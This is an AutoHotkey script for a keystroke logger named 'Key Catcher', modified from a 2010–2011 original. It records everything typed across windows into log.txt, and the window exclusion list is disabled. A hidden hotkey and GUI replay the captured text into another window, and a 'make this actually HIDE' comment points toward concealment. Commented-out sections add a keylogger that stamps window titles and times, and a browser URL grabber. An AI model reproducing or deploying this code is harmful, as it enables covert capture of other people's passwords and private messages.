;Copyright 2010-2011 Daniel Green, v1.00.3b modified 1/14/11 3:28am
;Key Catcher is free for both business and personal use. It can be freely modified and redistributed providing that, 1. all notices remain intact, 2. you acknowledge where it originally came from, 3. it is only used for legal and ethical purposes, 4. no profit is derived from its distribution.

#noenv
#singleinstance, ignore
setbatchlines, -1
setworkingdir, %a_scriptdir%
process, priority, ,high
coordmode, tooltip, screen

menu, tray, Icon, icons\main.ico, , 1
menu, tray, nostandard
menu, tray, tip, Logging Active
menu, tray, add, View Log, view
menu, tray, add, Delete Log, delete
menu, tray, add, About, about
menu, tray, add
menu, tray, add, Disable, suspend
menu, tray, add
menu, tray, add, Exit, exit


Gui, Add, Slider, vMySlider1 gSlide1, 100
Gui, Add, Slider, vMySlider2 gSlide2, 100
; Gui, Show
; Return 

; Slide1:
; GuiControlGet, MySlider1
; ; MsgBox % MySlider1
; Return

; Slide2:
; GuiControlGet, MySlider2
; ; MsgBox % MySlider2
; Return

settimer, mem, 1200000, 0

;{tab}{LControl}{RControl}{LAlt}{LWin}{RWin}{AppsKey}{F1}{F2}{F3}{F4}{F5}{F6}{F7}{F8}{F9}{F10}{F11}{F12}{Left}{Right}{Up}{Down}{Home}{End}{PgUp}{PgDn}{Del}{Ins}{BS}{Capslock}{Numlock}
;{PrintScreen}{Pause}{enter}
blank=
endkey=,
match=.,?,!

;MM Input in windows containing these strings will not be logged
windowblacklist=onenote,excel

; Create the array, initially empty:
global Array := [] ; or Array := Array()
global ArrayCount = 0
loop
{
	key=
	emptymem()

	WinGetActiveTitle, wintitle
	; if wintitle not contains %windowblacklist%
	{
		input, text, c v *, %endkey%, %match%
	
        key=%blank%
		if errorlevel=Match
		{
			;key=%blank%
		}
		
		else if errorlevel=NewInput
		{
			;key={Click}
		}
		
		else
		{
			stringtrimleft, key, errorlevel, 7
			key={%key%}
		}
		
		key=%key%
		text=%text%
		
		StringLen, length, text
		if length > 2
		{
			WinGetActiveTitle, wintitle
			
			; if wintitle not contains %windowblacklist%
			{
				; ifnotequal wintitle, %wintitleold%
				{
					; fileappend, `n%wintitle%`n, log.txt
					; wintitleold = %wintitle%
				}
				
				stringreplace, text, text, , %blank%
				; time=%a_dd%/%a_mm%/%a_yyyy% %a_hour%:%a_min%:%a_sec%
				fileappend, %text%%key%, log.txt ;`n  NEW LINE!
                keyy = {%text%%key%}
                Array.Push(keyy)
                ArrayCount += 1
			}
		}
	}
}

;MM Terminate input when mouse is used:
~LButton::
~RButton::
~MButton::
Input
return

Title := ""
; TODO make this actually HIDE
+!^v::
{
SetTitleMatchMode, 2
SetTitleMatchMode, Slow
WinGetTitle, Title, A
Gui, +AlwaysOnTop
Gui, Show
Return
}

Slide1:
GuiControlGet, MySlider1
IfWinExist, %Title%
    WinActivate ; use the window found above
Send, ^a
Send, {BackSpace}
global Var1 = f
for index, element in Array ; Enumeration is the recommended approach in most cases.
{
    Var1 := Var1 . element
    ; Using "Loop", indices must be consecutive numbers from 1 to the number
    ; of elements in the array (or they must be calculated within the loop).
    ; MsgBox % "Element number " . A_Index . " is " . Array[A_Index]
    ; Using "for", both the index (or "key") and its associated value
    ; are provided, and the index can be *any* value of your choosing.
    ; MsgBox % "Element number " . index . " is " . element
    Send, % Array[index]
}
Send, % Var1
Send, Array
; MsgBox % MySlider1
Return

Slide2:
GuiControlGet, MySlider2
; MsgBox % MySlider2
Return

write:
{
	time=%a_dd%/%a_mm%/%a_yyyy% %a_hour%:%a_min%:%a_sec%
	fileappend, %time% - %content%`n, log.txt
	emptymem()
}
return

view:
{
	fileinstall, log.txt, log.txt, 0
	runwait, log.txt
	emptymem()
}
return

delete:
{
	ifexist, log.txt
	{
		msgbox, 33, Confirm Delete, Delete log?

		ifmsgbox, ok
		{
			filerecycle, log.txt
			msgbox, 64, Log Deleted, The log file has been sent to the Recycle Bin., 5
			emptymem()
			return
		}
		else
		{
			emptymem()
			return
		}
	}

	ifnotexist, log.txt
	{
		msgbox, 64, Cannot Delete Log, Cannot delete log file because it does not exist., 5
		emptymem()
		return
	}
}
return

about:
{
	fileinstall, readme.txt, readme.txt, 0
	runwait, readme.txt
	emptymem()
}
return

suspend:
{
	if a_issuspended = 0
	{
		menu, tray, tip, Logging Suspended
		menu, tray, rename, Disable, Enable
		menu, tray, icon, icons\main.ico, , 1
		ToolTip, Logging Suspended, 2000, 750
		suspend, on
		pause, on
		emptymem()
	}
	else
	{
		menu, tray, tip, Logging Active
		suspend, off
		pause, off
		ToolTip
		menu, tray, rename, Enable, Disable
		menu, tray, icon, icons\main.ico, , 1
		emptymem()
	}
}
return

exit:
{
	exitapp
}
return

mem:
{
	emptymem()
}
return

emptymem()
{
	return, dllcall("psapi.dll\EmptyWorkingSet", "UInt", -1)
}

; START GET PAGE TITLE AND TIME
; Loop {                                              ; Keylogger that also records page title and time.
;   Input, k , V T5
;   FormatTime, t ,, MM-dd-yyyy  hh:mm:ss tt
;   WinGetActiveTitle , pt
;   pttk = `n`n`n****************`n%pt%`n%t%`n`n%k%   ;    Defines variable pttk: page title, time, keys logged
;   k:=pt!=pt2 ? pttk :k                              ;    Sets value of k to either pttk or k. 
;   FileAppend, %k% , key.log
;   pt2 := pt
; }


; START GRAB URL
;functions by Sean from http://www.autohotkey.com/board/topic/17633-retrieve-addressbar-of-firefox-through-dde-message/
;retrieve URL in iexplore, firefox and opera - 

;Chrome uses ControlGetText

; ^space::
; URL = 
; WinGetClass,class, A

; If (Class = "Chrome_WidgetWin_0" or Class = "Chrome_WidgetWin_1")
;  {
;   WinGetTitle, title, A
;   ControlGetText, url, Chrome_OmniboxView1, %title%
;   MsgBox % URL
;   return
;  }

; if Class = IEFrame
;  sServer := "Iexplore"
 
; If Class =  OperaWindowClass 
;  sServer := "Opera"   
 
; If ( Class = "MozillaUIWindowClass" or Class = "MozillaWindowClass" ) 
;  sServer := "FireFox"

; gosub GetURL  ;used for IE, Opera and Firefox
 
; MsgBox % URL
; return


; ;Seans code below
; GetURL: 
; sTopic  := "WWW_GetWindowInfo"
; sItem   := "0xFFFFFFFF"
; idInst  := DdeInitialize()
; hServer := DdeCreateStringHandle(idInst, sServer)
; hTopic  := DdeCreateStringHandle(idInst, sTopic )
; hItem   := DdeCreateStringHandle(idInst, sItem  )
; hConv := DdeConnect(idInst, hServer, hTopic)
; hData := DdeClientTransaction(0x20B0, hConv, hItem)   ; XTYP_REQUEST
; sData := DdeAccessData(hData)
; DdeFreeStringHandle(idInst, hServer)
; DdeFreeStringHandle(idInst, hTopic )
; DdeFreeStringHandle(idInst, hItem  )
; DdeUnaccessData(hData)
; DdeFreeDataHandle(hData)
; DdeDisconnect(hConv)
; DdeUninitialize(idInst)
; Loop,	Parse,	sData, CSV
; If	A_Index = 1
;  URL	:= A_LoopField
; return
; DdeInitialize(pCallback = 0, nFlags = 0){
;    DllCall("DdeInitialize", "UintP", idInst, "Uint", pCallback, "Uint", nFlags, "Uint", 0)
;    Return idInst
; }
; DdeUninitialize(idInst){
;    Return DllCall("DdeUninitialize", "Uint", idInst)
; }
; DdeConnect(idInst, hServer, hTopic, pCC = 0){
;    Return DllCall("DdeConnect", "Uint", idInst, "Uint", hServer, "Uint", hTopic, "Uint", pCC)
; }
; DdeDisconnect(hConv){
;    Return DllCall("DdeDisconnect", "Uint", hConv)
; }
; DdeAccessData(hData){
;    Return DllCall("DdeAccessData", "Uint", hData, "Uint", 0, "str")
; }
; DdeUnaccessData(hData){
;    Return DllCall("DdeUnaccessData", "Uint", hData)
; }
; DdeFreeDataHandle(hData){
;    Return DllCall("DdeFreeDataHandle", "Uint", hData)
; }
; DdeCreateStringHandle(idInst, sString, nCodePage = 1004){    
;    Return DllCall("DdeCreateStringHandle", "Uint", idInst, "Uint", &sString, "int", nCodePage)
; }
; DdeFreeStringHandle(idInst, hString){
;    Return DllCall("DdeFreeStringHandle", "Uint", idInst, "Uint", hString)
; }
; DdeClientTransaction(nType, hConv, hItem, sData = "", nFormat = 1, nTimeOut = 10000){
;    Return DllCall("DdeClientTransaction", "Uint", sData = "" ? 0 : &sData, "Uint", sData = "" ? 0 : StrLen(sData)+1, "Uint", hConv, "Uint", hItem, "Uint", nFormat, "Uint", nType, "Uint", nTimeOut, "UintP", nResult)
; }